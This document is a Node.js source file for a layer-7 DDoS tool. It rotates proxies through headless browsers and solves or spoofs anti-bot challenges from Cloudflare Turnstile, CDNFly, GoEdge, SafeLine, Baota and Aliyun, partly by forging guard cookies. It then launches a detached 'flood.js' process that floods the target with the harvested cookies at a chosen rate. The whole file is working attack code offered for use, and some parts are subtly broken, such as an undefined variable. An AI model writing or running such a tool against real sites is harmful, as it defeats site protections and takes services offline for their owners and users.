const { connect } = require('puppeteer-real-browser');
const fs = require('fs');
const { spawn } = require('child_process');
const async = require("async");
const crypto = require('crypto');

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

const targetURL = process.argv[2];
const duration = process.argv[3];
const threadBrowser = parseInt(process.argv[4]);
const threadFlood = process.argv[5];
const ratesFlood = process.argv[6];
const proxyFile = process.argv[7];
const useCaptcha = process.argv.includes('--chaptcha');

if (!targetURL || !duration || !threadBrowser || !threadFlood || !ratesFlood || !proxyFile) {
    console.log('Usage: node browser.js <target> <duration> <threadBrowser> <threadFlood> <ratesFlood> <proxyFile> [--chaptcha]');
    console.log('Example: node browser.js https://example.com 60 5 100 5000 proxies.txt --chaptcha');
    process.exit(1);
}

const proxies = fs.readFileSync(proxyFile, 'utf8').split('\n').filter(line => line.trim() && line.includes(':'));
let successCount = 0;
let totalAttempts = 0;
let challengeCount = 0;
let statusCodeStats = {};
let cachedResponse = null;
let captchaCode2 = null;
let bypassdone = true;
const COOKIES_MAX_RETRIES = 1;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function randstr(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

Array.prototype.remove = function(item) {
    const index = this.indexOf(item);
    if (index !== -1) this.splice(index, 1);
    return item;
}

const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/).filter(line => line.trim() !== '');
const randList = list => list[Math.floor(Math.random() * list.length)];

async function simulateHumanBehavior(page) {
    const movements = [];
    for (let i = 0; i < 5; i++) {
        movements.push({
            x: Math.floor(Math.random() * 1200) + 100,
            y: Math.floor(Math.random() * 600) + 100,
            delay: Math.random() * 200 + 100
        });
    }
    
    for (const move of movements) {
        await page.mouse.move(move.x, move.y);
        await sleep(move.delay);
    }

    const scrolls = [300, 150, -200, 100];
    for (const scroll of scrolls) {
        await page.evaluate((scrollY) => {
            window.scrollBy(0, scrollY);
        }, scroll);
        await sleep(Math.random() * 300 + 200);
    }

    if (Math.random() > 0.7) {
        await page.mouse.click(250 + Math.random() * 500, 200 + Math.random() * 300);
        await sleep(500 + Math.random() * 500);
    }
}

async function detectAndSolveChallenge(page, browserProxy) {
    const title = await page.title();
    const content = await page.content();

    if (title === "Attention Required! | Cloudflare" || title.includes("Access denied")) {
        bypassdone = false;
        throw new Error("Proxy blocked");
    }

    if (content.includes("challenge-error-text")) {
        await solveCloudflareChallenge(page, browserProxy);
        return;
    }

    if (content.includes("/_guard/html.js?js=click_html")) {
        const currentURL = await page.url();
        const parsedURL = new URL(currentURL);
        const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
        await page.goto(`${baseURL}/_guard/click.jpg`, { waitUntil: "domcontentloaded", timeout: 120000 });
        const newclickcookies = await page.cookies();
        const isnewclick = newclickcookies.find(cookie => cookie.name === 'guarddata');
        if (isnewclick) {
            await solveCdnflyNewClick(page, browserProxy);
            return;
        } else {
            await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            await solveCdnflyClick(page, browserProxy);
            return;
        }
    }

    if (content.includes("/_guard/html.js?js=captcha_html")) {
        await solveCdnflyCaptcha(page, browserProxy);
        return;
    }

    if (content.includes("/_guard/html.js?js=rotate_html")) {
        await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
        await sleep(1);
        const newrotatecookies = await page.cookies();
        const isnewrotate = newrotatecookies.find(cookie => cookie.name === 'guarddata');
        if (isnewrotate) {
            await solveCdnflyNewRotate(page, browserProxy);
            return;
        } else {
            await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            await solveCdnflyRotate(page, browserProxy);
            return;
        }
    }

    if (content.includes("/_guard/html.js?js=slider_html")) {
        const currentURL = await page.url();
        const parsedURL = new URL(currentURL);
        const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
        await page.goto(`${baseURL}/_guard/slide.png`, { waitUntil: "domcontentloaded", timeout: 120000 });
        const newslidecookies = await page.cookies();
        const isnewslide = newslidecookies.find(cookie => cookie.name === 'guarddata');
        if (isnewslide) {
            await solveCdnflyNewSlide(page, browserProxy);
            return;
        } else {
            await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            await solveCdnflySlide(page, browserProxy);
            return;
        }
    }

    if (content.includes("5_sec_checking")) {
        await solveGoedgeDelay(page, browserProxy);
        return;
    }

    if (content.includes("宝塔防火墙正在检查您的访问")) {
        await solveBaotaFirewall(page, browserProxy);
        return;
    }

    if (content.includes("static.geetest.com/v4/gt4.js") && content.includes("GOEDGE")) {
        await solveGoedgeGeetestSlide(page, browserProxy);
        return;
    }

    if (content.includes("SafeLineChallenge") && content.includes('level: "1"')) {
        await solveSafeLineJS(page, browserProxy);
        return;
    }

    if (content.includes("SafeLineWaitingRoom")) {
        await solveSafeLineWaitingRoom(page, browserProxy);
        return;
    }

    if (content.includes("aliyunCaptcha")) {
        await solveAliyunSlide(page, browserProxy);
        return;
    }

    const lecdnSlideBox = await page.$('.slideBox');
    if (lecdnSlideBox) {
        await solveLeCDNSlider(page, browserProxy);
        return;
    }

    const funcdnClickButton = await page.$('.sbbbbbsk-captcha-button-header');
    if (funcdnClickButton) {
        await solveFunCdnCaptcha(page, browserProxy);
        return;
    }

    const goedgeSliderInput = await page.$('.ui-input');
    if (goedgeSliderInput) {
        await solveGoEdgeSlider(page, browserProxy);
        return;
    }

    const goedgeCheckbox = await page.$('.ui-checkbox');
    if (goedgeCheckbox) {
        await solveGoEdgeClick(page, browserProxy);
        return;
    }

    await sleep(10000);
    bypassdone = true;
}

async function solveCloudflareChallenge(page, proxy) {
    let maxAttempts = 3;
    let index = 0;
    
    try {
        while (index < maxAttempts) {
            await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 100000 });
            const title2 = await page.title();
            const isbypassCfTurnstile = await page.$$('[name="cf-turnstile-response"]');
            
            if (isbypassCfTurnstile.length === 0 && (!title2.includes("Just a moment...") && !title2.includes("Please wait..."))) {
                bypassdone = true;
                break;
            } else {
                await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 20000 });
                await sleep(6);
            }
            
            try {
                const elements = await page.$$('[name="cf-turnstile-response"]');
                if (elements.length === 0) {
                    const coordinates = await page.evaluate(() => {
                        const coords = [];
                        document.querySelectorAll('div').forEach(item => {
                            const rect = item.getBoundingClientRect();
                            const style = window.getComputedStyle(item);
                            if (style.margin === "0px" && style.padding === "0px" && rect.width > 290 && rect.width <= 310 && !item.querySelector('*')) {
                                coords.push({ x: rect.x, y: rect.y, w: rect.width, h: rect.height });
                            }
                        });
                        return coords;
                    });

                    for (const { x, y, h } of coordinates) {
                        await page.mouse.click(x + 30, y + h / 2);
                    }
                } else {
                    for (const element of elements) {
                        const parent = await element.evaluateHandle(el => el.parentElement);
                        const box = await parent.boundingBox();
                        await page.mouse.click(box.x + 30, box.y + box.height / 2);
                    }
                }
            } catch (err) {}

            await sleep(6);
            const titleCheck = await page.title();
            const isbypassCfTurnstile2 = await page.$$('[name="cf-turnstile-response"]');

            if (isbypassCfTurnstile2.length === 0 && (!titleCheck.includes("Just a moment...") && !titleCheck.includes("Please wait..."))) {
                bypassdone = true;
                break;
            } else {
                await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 20000 });
            }
            index++;
        }
    } catch (err) {
        bypassdone = true;
        throw new Error("Failed Bypass");
    } finally {
        await sleep(3);
    }
}

async function solveCdnflyNewClick(page, proxy) {
    try {
        let maxAttempts = 5;
        let index = 0;
        
        while (index < maxAttempts) {
            const currentURL = await page.url();
            const parsedURL = new URL(currentURL);
            const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
            const timestamp = new Date().valueOf();
            const clickImageUrl = `${baseURL}/_guard/click.jpg?t=${timestamp}`;
            const viewSource = await page.goto(clickImageUrl, { waitUntil: "domcontentloaded", timeout: 120000 });
            await sleep(1);
            
            const newclickcookies = await page.cookies();
            const guard = newclickcookies.find(cookie => cookie.name === 'guard');
            const guardword = newclickcookies.find(cookie => cookie.name === 'guardword');

            await page.setCookie({ name: 'guardret', value: randstr(32), domain: new URL(currentURL).hostname });
            await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            
            const contentCheck = await page.content();
            if (!contentCheck.includes("/_guard/html.js?js=click_html")) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    } finally {
        await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
        await sleep(5);
    }
}

async function solveCdnflyClick(page, proxy) {
    try {
        let maxAttempts = 3;
        let index = 0;
        
        while (index < maxAttempts) {
            await page.waitForSelector('body', { visible: true, timeout: 30000 });
            await sleep(1);
            
            const contentCheck = await page.content();
            const mainAccessExists = await page.$('.main #access') !== null;
            
            if (mainAccessExists) {
                await page.click('.main #access');
            } else {
                await page.click('#access');
            }
            
            const newContent = await page.content();
            if (!newContent.includes("/_guard/html.js?js=click_html")) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
                await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            }
            
            if (!contentCheck.includes("/_guard/html.js")) {
                break;
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    } finally {
        await sleep(3);
    }
}

async function solveCdnflyCaptcha(page, proxy) {
    try {
        let maxAttempts = 5;
        let index = 0;
        
        while (index < maxAttempts) {
            const currentURL = await page.url();
            const parsedURL = new URL(currentURL);
            const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
            const timestamp = new Date().valueOf();
            const captchaImageUrl = `${baseURL}/_guard/captcha.png?t=${timestamp}`;
            const viewSource = await page.goto(captchaImageUrl, { waitUntil: "domcontentloaded", timeout: 120000 });
            await sleep(1);
            
            if (captchaCode === captchaCode2) {
                continue;
            }
            captchaCode2 = captchaCode;

            await page.setCookie({ name: 'guardret', value: randstr(8), domain: new URL(currentURL).hostname });
            await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            
            const contentCheck = await page.content();
            if (!contentCheck.includes("/_guard/html.js?js=captcha_html")) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    } finally {
        await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
        await sleep(5);
    }
}

async function solveCdnflyNewRotate(page, proxy) {
    try {
        let maxAttempts = 5;
        let index = 0;
        
        while (index < maxAttempts) {
            const currentURL = await page.url();
            const parsedURL = new URL(currentURL);
            const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
            const timestamp = new Date().valueOf();
            const rotateImageUrl = `${baseURL}/_guard/rotate.png?t=${timestamp}`;
            const viewSource = await page.goto(rotateImageUrl, { waitUntil: "domcontentloaded", timeout: 120000 });
            await sleep(1);
            
            const newrotatecookies = await page.cookies();
            const guard = newrotatecookies.find(cookie => cookie.name === 'guard');

            await page.setCookie({ name: 'guardret', value: randstr(32), domain: new URL(currentURL).hostname });
            await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            
            const contentCheck = await page.content();
            const titleCheck = await page.title();
            
            if (titleCheck.includes("Verification")) {
                await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            }
            
            if (!contentCheck.includes("/_guard/html.js?js=rotate_html")) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    } finally {
        await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
        await sleep(5);
    }
}

async function solveCdnflyRotate(page, proxy) {
    try {
        let maxAttempts = 5;
        let index = 0;
        
        while (index < maxAttempts) {
            const currentURL = await page.url();
            const parsedURL = new URL(currentURL);
            const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
            const timestamp = new Date().valueOf();
            const rotateImageUrl = `${baseURL}/_guard/rotate.jpg?t=${timestamp}`;
            const viewSource = await page.goto(rotateImageUrl, { waitUntil: "domcontentloaded", timeout: 120000 });
            await sleep(1);

            await page.setCookie({ name: 'guardret', value: randstr(32), domain: new URL(currentURL).hostname });
            await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            
            const contentCheck = await page.content();
            const titleCheck = await page.title();
            
            if (titleCheck.includes("rotate.jpg")) {
                await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            }
            
            if (!contentCheck.includes("/_guard/html.js?js=rotate_html")) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    } finally {
        await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
        await sleep(5);
    }
}

async function solveGoedgeGeetestSlide(page, proxy) {
    try {
        let maxAttempts = 5;
        let index = 0;
        
        while (index < maxAttempts) {
            await sleep(5);
            
            const bgImageUrl = await page.evaluate(() => {
                const bgElement = document.querySelector('.geetest_bg');
                if (bgElement) {
                    const style = bgElement.style.backgroundImage;
                    return style.match(/url\("([^"]+)"\)/)?.[1] || null;
                }
                return null;
            });
            
            const sliceBgImageUrl = await page.evaluate(() => {
                const sliceElement = document.querySelector('.geetest_slice_bg');
                if (sliceElement) {
                    const style = sliceElement.style.backgroundImage;
                    return style.match(/url\("([^"]+)"\)/)?.[1] || null;
                }
                return null;
            });
            
            if (!bgImageUrl || !sliceBgImageUrl) {
                await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
                bypassdone = false;
                index++;
                continue;
            }

            const sliderElement = await page.$('.geetest_btn');
            const sliderBoundingBox = await sliderElement.boundingBox();
            
            if (sliderBoundingBox) {
                const randomOffset = Math.random() * 10 + 10;
                const startX = sliderBoundingBox.x + randomOffset;
                const startY = sliderBoundingBox.y + 20;
                await page.mouse.move(startX, startY);
                await page.mouse.down();
                
                const totalDistance = 200 + Math.random() * 100;
                const steps = 5;
                let currentX = startX;
                let stepDistance = totalDistance / steps;
                
                for (let i = 0; i < steps; i++) {
                    const moveX = currentX + stepDistance;
                    await page.mouse.move(moveX, startY + (Math.random() * 2 - 1));
                    currentX = moveX;
                    await sleep(50);
                }
                
                await page.mouse.up();
                await sleep(3);
            } else {
                bypassdone = false;
                index++;
                continue;
            }

            const contentCheck = await page.content();
            if (!contentCheck.includes("static.geetest.com/v4/gt4.js") && !contentCheck.includes("GOEDGE")) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    } finally {
        await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
        await sleep(5);
    }
}

async function solveCdnflyNewSlide(page, proxy) {
    try {
        let maxAttempts = 5;
        let index = 0;
        
        while (index < maxAttempts) {
            const currentURL = await page.url();
            const parsedURL = new URL(currentURL);
            const baseURL = `${parsedURL.protocol}//${parsedURL.hostname}`;
            const timestamp = new Date().valueOf();
            const slideImageUrl = `${baseURL}/_guard/slide.png?t=${timestamp}`;
            const viewSource = await page.goto(slideImageUrl, { waitUntil: "domcontentloaded", timeout: 120000 });
            await sleep(1);
            
            const newslidecookies = await page.cookies();
            const guard = newslidecookies.find(cookie => cookie.name === 'guard');
            const guardword = newslidecookies.find(cookie => cookie.name === 'guardword');

            await page.setCookie({ name: 'guardret', value: randstr(32), domain: new URL(currentURL).hostname });
            await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });

            const contentCheck = await page.content();
            if (!contentCheck.includes("/_guard/html.js?js=slider_html")) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    } finally {
        await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
        await sleep(5);
    }
}

async function solveCdnflySlide(page, proxy) {
    try {
        let maxAttempts = 5;
        let index = 0;
        
        while (index < maxAttempts) {
            await page.waitForSelector('#slider', { visible: true, timeout: 30000 });
            await sleep(1);
            
            const sliderElement = await page.$('#slider');
            const sliderBoundingBox = await sliderElement.boundingBox();
            
            await sliderElement.click();
            const randomOffset = Math.random() * 10 + 10;
            await page.mouse.move(sliderBoundingBox.x + randomOffset, sliderBoundingBox.y + 20);
            await page.mouse.down();
            
            for (let i = 0; i < 20; i++) {
                await page.mouse.move(sliderBoundingBox.x + (i * sliderBoundingBox.width / 20), sliderBoundingBox.y + 20);
            }
            
            await page.mouse.up();
            await sleep(Math.random() * 5 + 3);
            
            const contentCheck = await page.content();
            if (!contentCheck.includes("/_guard/html.js?js=slider_html")) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
                await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            }
            
            if (!contentCheck.includes("/_guard/html.js")) {
                break;
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    } finally {
        await sleep(5);
    }
}

async function solveSafeLineJS(page, proxy) {
    try {
        let maxAttempts = 3;
        let index = 0;
        
        while (index < maxAttempts) {
            await sleep(8);
            const contentCheck = await page.content();
            
            if (!contentCheck.includes("SafeLineChallenge") && !contentCheck.includes('level: "1"')) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
                await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    }
}

async function solveSafeLineWaitingRoom(page, proxy) {
    try {
        let maxAttempts = 50;
        let index = 0;
        
        while (index < maxAttempts) {
            await sleep(10);
            const contentCheck = await page.content();
            
            if (!contentCheck.includes("SafeLineWaitingRoom")) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
                await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    }
}

async function solveAliyunSlide(page, proxy) {
    try {
        let maxAttempts = 10;
        let index = 0;

        while (index < maxAttempts) {
            await page.waitForSelector('#aliyunCaptcha-sliding-slider', { visible: true, timeout: 30000 });
            await sleep(2);
            
            const sliderElement = await page.$('#aliyunCaptcha-sliding-slider');
            const sliderBoundingBox = await sliderElement.boundingBox();
            
            const startX = sliderBoundingBox.x + 12;
            const startY = sliderBoundingBox.y + 20;
            const endX = sliderBoundingBox.x + 380;
            const endY = startY;
            
            await page.mouse.move(startX, startY);
            await page.mouse.down();
            await page.mouse.move(endX, endY);
            await page.mouse.up();
            await sleep(3);
            
            const contentCheck = await page.content();
            if (!contentCheck.includes("aliyunCaptcha")) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
                await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    }
}

async function solveLeCDNSlider(page, proxy) {
    try {
        let maxAttempts = 3;
        let index = 0;
        
        while (index < maxAttempts) {
            await page.waitForSelector('#slider', { visible: true, timeout: 30000 });
            await sleep(1);
            
            const sliderElement = await page.$('#slider');
            const sliderBoundingBox = await sliderElement.boundingBox();
            const endX = sliderBoundingBox.x + 330;
            
            await page.mouse.move(sliderBoundingBox.x, sliderBoundingBox.y);
            await page.mouse.down();
            await page.mouse.move(endX, sliderBoundingBox.y);
            await page.mouse.up();
            await sleep(3);
            
            const slideBoxCheck = await page.$('.slideBox');
            if (!slideBoxCheck) {
                bypassdone = true;
                break;
            } else {
                bypassdone = false;
                await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 120000 });
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    }
}

async function solveFunCdnCaptcha(page, proxy) {
    try {
        let maxAttempts = 3;
        let index = 0;
        
        while (index < maxAttempts) {
            await page.waitForSelector('.sk-captcha-button-header', { visible: true, timeout: 30000 });
            await sleep(2);
            await page.click('.sk-captcha-button-header');
            await sleep(3);
            
            const buttonCheck = await page.$('.sk-captcha-button-header');
            if (!buttonCheck) {
                bypassdone = true;
                break;
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    }
}

async function solveGoEdgeSlider(page, proxy) {
    try {
        let maxAttempts = 3;
        let index = 0;
        
        while (index < maxAttempts) {
            await page.waitForSelector('.ui-input', { visible: true, timeout: 30000 });
            const inputElement = await page.$('.ui-input');
            const inputBoundingBox = await inputElement.boundingBox();
            
            await inputElement.click();
            const handlerElement = await page.$('.ui-handler');
            await handlerElement.hover();
            await page.mouse.down();
            
            for (let i = 0; i < 20; i++) {
                await page.mouse.move(inputBoundingBox.x + (i * inputBoundingBox.width / 20), inputBoundingBox.y);
                await sleep(Math.random() * 100 + 50);
            }
            
            await page.mouse.up();
            await sleep(3);
            
            const inputCheck = await page.$('.ui-input');
            if (!inputCheck) {
                bypassdone = true;
                break;
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    }
}

async function solveGoEdgeClick(page, proxy) {
    try {
        let maxAttempts = 3;
        let index = 0;
        
        while (index < maxAttempts) {
            await page.waitForSelector('.ui-checkbox', { visible: true, timeout: 30000 });
            await page.click('.ui-checkbox');
            await sleep(3);
            
            const checkboxCheck = await page.$('.ui-checkbox');
            if (!checkboxCheck) {
                bypassdone = true;
                break;
            }
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    }
}

async function solveGoedgeDelay(page, proxy) {
    try {
        let maxAttempts = 3;
        let index = 0;
        
        while (index < maxAttempts) {
            await sleep(10);
            bypassdone = true;
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    }
}

async function solveBaotaFirewall(page, proxy) {
    try {
        let maxAttempts = 3;
        let index = 0;
        
        while (index < maxAttempts) {
            await sleep(10);
            bypassdone = true;
            index++;
        }
    } catch (err) {
        bypassdone = false;
        throw new Error("Failed Bypass");
    }
}

async function runBrowser(proxy) {
    totalAttempts++;
    const [proxyHost, proxyPort] = proxy.split(':');
    
    try {
        const { page, browser } = await connect({
            headless: true,
            turnstile: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--window-size=1920,1080'
            ],
            proxy: {
                host: proxyHost,
                port: parseInt(proxyPort)
            }
        });

        await page.setViewport({ width: 1920, height: 1080 });

        const client = page._client();
        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
                client.send("Target.detachFromTarget", { targetId: frame._id });
            }
        });

        page.setDefaultNavigationTimeout(60 * 1000);

        const userAgent = await page.evaluate(() => navigator.userAgent);
        
        let statusCode = null;
        const response = await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 10000 });
        statusCode = response.status();

        page.on('response', async (response) => {
            if (response.url() === targetURL) {
                const updatedStatusCode = response.status();
                if (updatedStatusCode !== statusCode) {
                    statusCode = updatedStatusCode;
                }
            }
        });

        await detectAndSolveChallenge(page, proxy);

        if (bypassdone === true) {
            challengeCount++;
            const cookies = await page.cookies(targetURL);
            const cookieString = cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim();

            const floodArgs = [
                'flood.js', 'GET', targetURL, duration, threadFlood, ratesFlood, 
                proxyFile, '--cookie', cookieString, '--referer', 'rand'
            ];

            if (useCaptcha) {
                floodArgs.push('--chaptcha');
            }

            const floodProcess = spawn('node', floodArgs, {
                stdio: 'inherit',
                detached: true
            });

            floodProcess.unref();
            successCount++;
        }

        await browser.close();

        const successRate = ((successCount / totalAttempts) * 100).toFixed(1);
        console.log(`Success: ${successRate}% | Challenges: ${challengeCount} | Total: ${successCount}/${totalAttempts}`);

    } catch (error) {
        // Silent error handling
    }
}

async function startAttack() {
    console.log('Starting browser bypass...');

    const queue = async.queue(async (proxy, callback) => {
        await runBrowser(proxy);
        callback();
    }, threadBrowser);

    proxies.forEach(proxy => {
        if (proxy && proxy.includes(':')) {
            queue.push(proxy);
        }
    });

    setTimeout(() => {
        process.exit(0);
    }, duration * 1000);
}

startAttack().catch(() => {});